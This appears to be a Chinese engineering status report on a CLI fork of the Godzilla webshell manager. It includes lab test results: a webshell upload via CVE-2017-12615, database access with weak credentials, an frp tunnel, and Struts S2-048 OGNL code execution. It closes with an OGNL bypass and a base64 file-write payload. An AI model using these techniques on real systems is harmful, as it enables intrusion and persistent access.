| `ProxyT` 源码缺失（F8）：S0 编译失败 / 代理词汇不可核实 | S0 依赖第 4 档（反编译重建随 fork 版本化，或提取 class 入 classpath）；代理类型字符串从 Release jar 实测确认后写入 skill 与 L2 校验 |

---

## 10. 实施状态（2026-09-29 · 首轮落地完成）

**已落地（本仓库 D1 + 构建 + 验收）**：

| 交付物 | 状态 | 偏差/备注 |
|---|---|---|
| S0 构建 | ✅ Maven 路线（pom.xml + shade uber-jar，`target/gsl5.jar` ≈84.7MB） | 依赖走 `com.gsl5.thirdparty:origin-libs`（用户提供 `origin-jar/gsl5.jar` 提取：全部第三方类树 − src 已有类（零重叠）+ 8 个 GBK 类例外）；**不再依赖 legacy godzilla-cli.jar**（用户指令） |
| 缺失类 | ✅ | 实测缺口远超 v1 预估：imports 对照共 **76 类**无源。其中 CLI 关键 5 文件源码重建（CFR 反编译 origin-jar：ProxyT/EasyI18N/I18NAction/NoI18N/GodzillaObjectInputFilter + godzilla_*.properties 资源束）；其余 73 类经 origin-libs 字节码参与编译 |
| D1 既有文件 | ✅ | 4 处追加式改动落地：Gsl5Main cli 分支 / McpService 双 seam / Db WAL+busy_timeout / OperationLogStore `-Dgsl5.data.dir` |
| D1 CliMain | ✅ | 实际 ~970 行（MiniJson + tools 目录 + doctor + 写锁超预期）；L2 表 46 命令（超首版 25）；L1 `call` 透传 + task/task list/version/doctor 元命令齐备 |
| cli/ 资产 | ✅ | wrapper（chdir + 唯一性守卫 + NFS 拒绝 + shared/profile 符号链接 + `-Dgsl5.task/tasks.root/data.dir` 传递）、build-cli.sh、SKILL.md、tests/compat-golden.sh |
| S1 验收 | ✅ | stdout 单行 JSON 纯净；task 解析矩阵（flag/env/flag>env）；task 隔离（iso1/iso2 data.db 独立）；并发 20 shell_add 零丢失（WAL+busy_timeout）；task 写锁（.write.lock，exit 5）；审计落 `<task>/logs/operation_audit.db`（23 条 cli 落账实测）；退出码矩阵 0/2/3 可触发 |
| golden | ✅ 15/15 | `cli/tests/compat-golden.sh`（含 task 解析矩阵、task 名消毒、call 双路径、tools 目录、doctor、审计落位） |
| §4.1 TC1/TC2 | ✅ 实测通过 | TC1：shell_create→PUT 201（CVE-2017-12615）→shell_add→shell_info（root@容器，内网 172.31.0.10）→shell_exec id/hostname；TC2：经壳 db_connect 内网 MySQL root/123456 → version()=5.5.23 → corp_db(users,customers)。清理：源文件+Tomcat work 编译缓存单命令同删（教训：删源不删缓存，Tomcat 仍以已加载类服务）+ 残余 clean12615.jsp 以惰性占位覆盖 |
| §2.4 发现机制 | ✅ | `gsl5 tools [keyword]` / `tools <name>` / `--json` 全落地（cliToolsListRaw seam 驱动） |
| §4.4 L2 写锁 | ✅ | `.write.lock` FileChannel 独占，快速写命令串行化，10s 超时 exit 5 |

**实现期修正（相对本方案正文）**：

1. **task 解析优先级实现**：wrapper 消费 `--task` 后以 `-Dgsl5.task` 传入 → CLI 实际优先级 = `--task`（flag 或 wrapper -D）> `GSL5_TASK` env > `default`（§2.1 文字不变，机制明确化）。
2. **`file_read --out` 修正**：file_read 工具无 localPath 参数——"直存本地"由 `file_download_local --out <localPath>` 承担（--out 为其别名）；§2.3 示例以本节为准。
3. **双编码编译细节**：默认 UTF-8 遍加 `-sourcepath <空>` 禁隐式源码编译（同包引用会把 GBK 文件拉进 UTF-8 遍报 unmappable error）；GBK 遍绑定 `process-classes` 保证次序；8 个 GBK 类保留在 origin-libs 供默认遍签名解析。
4. **assets/asm 松散 .class 不打包**（CoreClassLoader "wrong name" 实测），`asm.jar` 走 `**/*.jar` 照常。
5. **workspace 沙箱注意**：`~/.m2` 只读时用 `GSL5_MVN_ARGS="-Dmaven.repo.local=$PWD/.build-tmp/m2repo"`（build-cli.sh 已支持）。

**提交前复核修正（2026-09-29 复审轮，全部回归验证后入库）**：

6. **`call` 透传工具名错位修复**：`tail()` 已去 "call" 后仍取 `a[1]` 为工具名，导致 `call <tool> --json` 把 `--json` 当工具名（L1 面实际不可用；旧 golden 用例假阳性未暴露）。修为 `a[0]`，golden 新增 call 成功透传断言。
7. **失败判定加固**：FAILURE_PREFIXES 扩充（连接/导入/载荷初始化/加密器初始化/插件加载失败）+ 前 30 字符内含"失败"令牌的兜底判定，消除未列出文案的假成功。
8. **信封保留键**：工具返回 JSON 合入信封时过滤 `ok`/`task`/`tool`，契约字段不被业务数据覆盖。
9. **`tools <keyword>` 回落**：精确名未命中时回落关键词过滤（§2.4 发现面承诺），渲染为目录行而非 schema 详情。
10. **task 名消毒**：wrapper 拒绝含 `..`/`/`/`\` 的 task 名（退出码 2，防路径逃逸）；golden 加用例。
11. 其余：写锁 FileChannel 显式关闭、taskName 注释与实际优先级对齐、未用 import 清理、pom 头注释与 origin-libs 实际提取流程对齐。

**未做（后续轮次）**：S3 三宿主模板微调投放、S4 mirrorstrike / S5 deepstrike 消费侧切换（其他仓库）、README 构建节改写（README.md 顶部横幅已指向 README-CLI.md）。git `cli` 分支提交与 tag `3.1.8+cli.1` 已于复审轮完成并 push origin。

### 10.1 TC3 实测结果（frp 隧道 → S2-048，AGENTS.md §4.1）

| 步骤 | 结果 |
|---|---|
| frps/frpc 隧道 | ✅ `file_upload_local` 分片上传 frpc（16.6MB）→ 壳 A(.10) nohup 启动 → 本机 socks5(1080) 贯通内网（`.11:8080` HTTP 200, 214ms） |
| S2-048 定位 | ⚠️ 侦察修正：目标是 **struts2-showcase 全量包部署于根上下文**（vulhub 式 GreetingAction 不存在，config-browser 证实 /integration 仅 gangster）；Struts **2.3.32**；真实 sink = `/integration/saveGangster.action` 的 `name` 参数（MSF `struts2_code_exec_showcase` 同款）。关键旁路：`@com.opensymphony.xwork2.ognl.OgnlUtil@class` + `getExcluded*().clear()`（非 `@ognl.OgnlUtil@class`）；eval 探针 `%{'a'+'b'}` 命中确认 |
| RCE | ✅ root@42efa11d2843（容器，`/usr/local/tomcat/webapps/ROOT`） |
| 落壳受阻 | ⚠️ 目标对**所有 `*.jsp` 一律 403**（含 127.0.0.1 自访问，既有 index.jsp 同拦；静态/.action 正常）——环境级加固。base64-in-OGNL 写盘成功（md5 一致），但 Godzilla 壳无法被 HTTP 触达 → **RCE 达成（命令执行级 getshell），Godzilla 壳接管未达成** |
| 步骤6-7 | `shell_add --proxyType SOCKS` 注册成功；连接失败暴露**已知问题 K1**：载荷初始化失败被上游错误路径掩盖为 `HeadlessException`（应返回干净错误），列入 fork 改进 backlog |
| 清理 | ✅ .11：OGNL 删 shell048/test.jsp/pwn.txt+work 缓存；.10：杀 frpc、删 frpc/toml/jsp 源+work 缓存；本机：停 frps、删 lab-tc3 task。**残留说明**：.11/.10 的 Tomcat JVM 内存中已加载 JSP 类重启前仍可服务（物理文件已零残留） |

**OGNL 写文件技巧（复用价值）**：目标无 python 时，shell 内容 base64 直接内嵌 OGNL：`(#b=(@java.util.Base64@getDecoder()).decode('...')).(#fos=new java.io.FileOutputStream('...')).(#fos.write(#b)).(#fos.close())`；OGNL cmd 字符串内**禁用单引号**（会截断 `(#cmd='...')`），shell 引号一律用双引号。
